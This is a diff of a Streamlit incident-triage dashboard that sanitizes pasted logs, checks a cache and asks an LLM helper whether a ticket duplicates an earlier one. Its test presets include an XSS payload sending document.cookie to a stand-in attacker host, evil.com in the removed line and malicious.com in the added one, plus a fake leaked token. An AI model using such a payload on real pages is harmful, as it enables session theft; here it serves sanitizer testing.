@@ -8,10 +8,10 @@ from src.processor import TicketProcessor
 from src.llm_helper import LLMDeduplicatorHelper
 from src.cache import RedisSimulationCache
 
-# Configure page visibility constraints
+# Configure page layout and security headers
 st.set_page_config(page_title="DedupeAI Enterprise Console", layout="wide")
 
-# Initialize infrastructure components inside session memory state
+# Initialize shared infrastructure components inside state memory
 if "processor" not in st.session_state:
     st.session_state.processor = TicketProcessor()
 if "ai_helper" not in st.session_state:
@@ -23,54 +23,55 @@ proc = st.session_state.processor
 ai_helper = st.session_state.ai_helper
 cache = st.session_state.redis_cache
 
-# Ensure base records are active
+# Ensure relational database baseline is fully seeded
 proc.seed_historical_baseline()
 
-st.title("🛡️ DedupeAI — Upgraded Fullstack Security Cockpit")
+st.title("🛡️ DedupeAI — Secure Fullstack Enterprise Dashboard")
 st.markdown("---")
 
+# Split view: Form controls on left, performance analytics/logs on right
 col_left, col_right = st.columns([2, 3])
 
 with col_left:
-    st.subheader("📥 Secure Incident Intake Channel")
+    st.subheader("📥 Secure Data Intake Channel")
     st.markdown("---")
     
-    # Premium Simulation Packages
+    # Fast macro injection scenarios [backend_Securities: Input Validation]
     st.markdown("**Incident Inject Simulation Presets:**")
     b1, b2, b3 = st.columns(3)
     preset_text = ""
     with b1:
-        if st.button("Database Connection Pool"):
-            preset_text = "FATAL ERROR: Remaining connection slots are fully exhausted for active superusers. API latency spiking."
+        if st.button("Database Pool Fault"):
+            preset_text = "FATAL ERROR: Remaining connection slots are fully exhausted for active production superusers. Latency spike."
     with b2:
-        if st.button("XSS Script Inject Attack"):
-            preset_text = "<script>window.location='http://evil.com/steal?cookie='+document.cookie</script> Login page validation error."
+        if st.button("XSS Script Inject"):
+            preset_text = "<script>fetch('http://malicious.com/steal?cookie='+document.cookie)</script> UI login routing error."
     with b3:
-        if st.button("Leaked API Authorization Key"):
-            preset_text = "Cron framework crash logs reporting failure using master credentials: BEARER_TOKEN=AIzaSyB9X8Y7Z6W5V4U3T2S1R0Q9P8O7N6M5"
+        if st.button("Leaked Config Key"):
+            preset_text = "Worker node daemon crash reporting trace authentication failure using master secret: ACCESS_TOKEN=AIzaSyB9X8Y7Z6W5"
 
     input_text = st.text_area(
-        "Paste System Error Log / Support Ticket:",
+        "Paste System Error Log / Incident Ticket:",
         value=preset_text if preset_text else "",
         height=180,
-        placeholder="Logs pasted here are automatically checked for hidden credentials and injection strings..."
+        placeholder="Logs pasted here are automatically audited for malicious script injection and hidden text credentials..."
     )
     
-    fire_analysis = st.button("Execute Secure Triage Loop", type="primary")
+    fire_triage = st.button("Execute Secure Triage Loop", type="primary")
 
 with col_right:
-    st.subheader("📊 Triage Performance & Security Analytics")
+    st.subheader("📊 Operational Analytics & Verdict Workbench")
     st.markdown("---")
     
-    if fire_analysis and input_text.strip():
-        # Defensive Control Wrapper: Hide Internal Errors from breaking to clients
+    if fire_triage and input_text.strip():
+        # Defensive Control Wrapper: Hide internal framework failures [backend_Securities: Hide Internal Errors]
         try:
-            # 1. Enforce background protection checks (Sanitization & Sensitive Data Masking)
+            # 1. Enforce validation filtering and sensitive data redacting [backend_Securities: Masking & Sanitization]
             cleaned_input = proc.sanitize_and_mask_input(input_text)
             
-            st.info(f"🔒 **Sanitized Engine Stream Input View:**\n`{cleaned_input}`")
+            st.info(f"🔒 **Sanitized Ingestion Stream Preview:**\n`{cleaned_input}`")
             
-            # Generate a secure execution fingerprint hash key for the Redis memory cache tier
+            # Formulate string pointer for memory cluster mapping
             cache_key = f"verdict:{hash(cleaned_input)}"
             
             # 2. Check low-latency memory caching tier first to protect throughput
@@ -78,39 +79,39 @@ with col_right:
             
             if cached_verdict:
                 ai_verdict = cached_verdict
-                st.caption("⚡ *Performance Metric: Low-Latency Memory Cache Hit! Retaining API units.*")
+                st.caption("⚡ *Performance Metric: Low-Latency Memory Cache Hit! Bypassing extra cloud token usage.*")
                 proc.log_security_event("CACHE_PERIMETER_HIT", "SUCCESS", {"key": cache_key})
             else:
-                # Cache Miss: Execute the full matching pipelines
+                # Cache Miss: Execute processing and vector metrics mapping
                 matches = proc.find_top_matches(cleaned_input, top_n=3)
                 ai_verdict = ai_helper.verify_duplicate_status(cleaned_input, matches)
                 
-                # Commit response payload to the cache tier
+                # Update memory caching structures
                 cache.set(cache_key, ai_verdict)
                 proc.log_security_event("CACHE_PERIMETER_MISS", "PROCESSED", {"key": cache_key})
 
-            # 3. Dynamic UI interpretation based on cognitive gate values
+            # 3. Read verdict fields returned from structured JSON block
             is_dup = False
             for key in ["is_duplicate", "isDuplicate", "IS_DUPLICATE"]:
                 if key in ai_verdict:
                     is_dup = bool(ai_verdict[key])
 
             confidence = ai_verdict.get("confidence_percentage", 0)
-            reasoning = ai_verdict.get("reasoning", "Verification complete.")
-            action = ai_verdict.get("recommended_action", "Review ticket parameters manually.")
+            reasoning = ai_verdict.get("reasoning", "Analysis executed without code errors.")
+            action = ai_verdict.get("recommended_action", "Review incident routing metrics.")
             target_id = ai_verdict.get("target_duplicate_id", None)
 
             if is_dup:
-                st.error(f"🚨 DUPLICATE DETECTED (Confidence Score Match: {confidence}%)")
-                st.markdown(f"**Action Required:** `{action}`")
-                st.markdown(f"**Technical Comparison Summary:** *{reasoning}*")
-                proc.log_security_event("INCIDENT_TRIAGE_VERDICT", "DUPLICATE_FOUND", {"linked_to": target_id})
+                st.error(f"🚨 DUPLICATE DETECTED (System Match Confidence: {confidence}%)")
+                st.markdown(f"**Recommended Step:** `{action}`")
+                st.markdown(f"**AI Comparison Logic:** *{reasoning}*")
+                proc.log_security_event("INCIDENT_TRIAGE_VERDICT", "DUPLICATE_BOUND", {"linked_to": target_id})
             else:
-                st.success("✅ UNIQUE STANDALONE TICKET VERIFIED (Saved to Data Matrix)")
-                st.markdown(f"**Action Required:** `Route to assigned department queue.`")
-                st.markdown(f"**Technical Comparison Summary:** *{reasoning}*")
+                st.success("✅ UNIQUE STANDALONE TICKET VERIFIED (Saved to Schema Database)")
+                st.markdown(f"**Recommended Step:** `Assign to specialized department queue.`")
+                st.markdown(f"**AI Comparison Logic:** *{reasoning}*")
                 
-                # Dynamic Learning: Save unique record directly back into relational table arrays
+                # Dynamic Learning Loop: Write unique entry back into relational tables instantly
                 new_id = f"TS-DYN-{int(datetime.now().timestamp())}"
                 try:
                     conn = sqlite3.connect(proc.db_path)
@@ -125,7 +126,7 @@ with col_right:
                 except Exception:
                     pass
 
-            # 4. Render Plotly Horizontal Similarity engine chart spectrum
+            # 4. Generate data chart spectrum using Plotly horizontal visualization grid
             fresh_matches = proc.find_top_matches(cleaned_input, top_n=3)
             if fresh_matches:
                 st.markdown("---")
@@ -138,26 +139,26 @@ with col_right:
                     orientation="h",
                     color="similarity_score",
                     color_continuous_scale="Reds",
-                    labels={"similarity_score": "Cosine Overlap Score", "ticket_id": "Row Entity ID"}
+                    labels={"similarity_score": "Cosine Score Coefficient", "ticket_id": "Row ID Reference"}
                 )
                 fig.update_layout(height=170, margin=dict(l=10, r=10, t=10, b=10), template="plotly_dark")
                 st.plotly_chart(fig, use_container_width=True)
 
-        except Exception as system_exception:
-            # Hide Internal Errors: Suppress python traceback metrics from the user view
+        except Exception as system_fault:
+            # Hide Internal Errors: Suppress raw trace values from breaking the viewport layout 
             st.error("⚠️ An internal infrastructure exception occurred while triaging this log record. Stack trace details have been shielded.")
-            proc.log_security_event("SYSTEM_CORE_ERROR", "FAILURE", {"details": str(system_exception)})
+            proc.log_security_event("SYSTEM_CORE_ERROR", "FAILURE", {"details": str(system_fault)})
 
-    elif fire_analysis:
-        st.warning("Please input a valid text string to run triage.")
+    elif fire_triage:
+        st.warning("Please specify a non-empty string payload.")
     else:
-        st.caption("Operational cockpit status: Idle. Click a simulation preset to launch.")
+        st.caption("Operational cockpit status: Idle. Trigger an inspection preset above to launch.")
 
-# Bottom Panel Dashboard: Real-Time Security Audit Logs Grid View
+# Bottom Panel Dashboard View: Security Auditing [backend_Securities: Audit Trails]
 st.markdown("---")
-st.subheader("📋 Operational Security Audit Stream (Real-Time SQLite Logs)")
+st.subheader("📋 Operational Security Audit Stream (Real-Time SQLite Log Matrix)")
 audit_logs_df = proc.fetch_audit_logs()
 if not audit_logs_df.empty:
     st.dataframe(audit_logs_df, use_container_width=True, hide_index=True)
 else:
-    st.caption("No auditable transaction records currently found in session memory.")
+    st.caption("No auditable transaction records currently found in session storage logs.")
